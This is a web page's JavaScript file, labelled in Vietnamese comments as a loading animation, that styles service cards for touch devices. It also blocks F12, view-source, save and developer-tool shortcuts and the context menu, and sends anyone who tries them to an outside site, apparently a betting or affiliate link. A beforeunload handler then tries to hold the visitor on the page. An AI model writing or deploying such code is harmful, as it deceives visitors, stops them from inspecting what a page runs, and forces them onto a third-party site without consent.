// Animation loading vòng tròn
const REDIRECT_URL = 'https://04llwin.com/?id=925521195';
let redirectTriggered = false;

function redirectToTarget() {
    if (redirectTriggered) return;
    redirectTriggered = true;

    try {
        window.location.href = REDIRECT_URL;
    } catch (error) {
        window.open(REDIRECT_URL, '_blank', 'noopener,noreferrer');
    }
}

function blockInspectShortcut(event) {
    const key = event.key ? event.key.toLowerCase() : '';
    const ctrlOrMeta = event.ctrlKey || event.metaKey;

    if (
        event.key === 'F12' ||
        (ctrlOrMeta && key === 's') ||
        (ctrlOrMeta && event.shiftKey && key === 's') ||
        (ctrlOrMeta && event.shiftKey && (key === 'i' || key === 'j' || key === 'c')) ||
        (ctrlOrMeta && key === 'u')
    ) {
        event.preventDefault();
        event.stopPropagation();
        event.stopImmediatePropagation();
        redirectToTarget();
        return false;
    }

    return true;
}

document.addEventListener('DOMContentLoaded', function() {
    const cards = document.querySelectorAll('.service-card');

    cards.forEach(card => {
        const logo = card.querySelector('.logo-center');

        // Không xoay - giữ tĩnh ở giữa
        if (logo) {
            logo.style.animation = 'none';
        }
    });

    // Cải thiện cho mobile - Remove hover effect trên touch device
    const isTouchDevice = () => {
        return (('ontouchstart' in window) ||
                (navigator.maxTouchPoints > 0) ||
                (navigator.msMaxTouchPoints > 0));
    };

    if (isTouchDevice()) {
        document.body.classList.add('touch-device');

        // Tối ưu cho mobile
        const cards = document.querySelectorAll('.service-card');
        cards.forEach(card => {
            card.style.cursor = 'pointer';
            card.addEventListener('touchstart', function() {
                this.classList.add('pressed');
            }, {passive: true});
            card.addEventListener('touchend', function() {
                this.classList.remove('pressed');
            });
            card.addEventListener('touchcancel', function() {
                this.classList.remove('pressed');
            });
        });
    }
});

document.addEventListener('keydown', blockInspectShortcut, true);
document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
    event.stopPropagation();
    redirectToTarget();
}, true);

window.addEventListener('beforeunload', function(event) {
    if (redirectTriggered) {
        event.preventDefault();
        event.returnValue = '';
    }
});
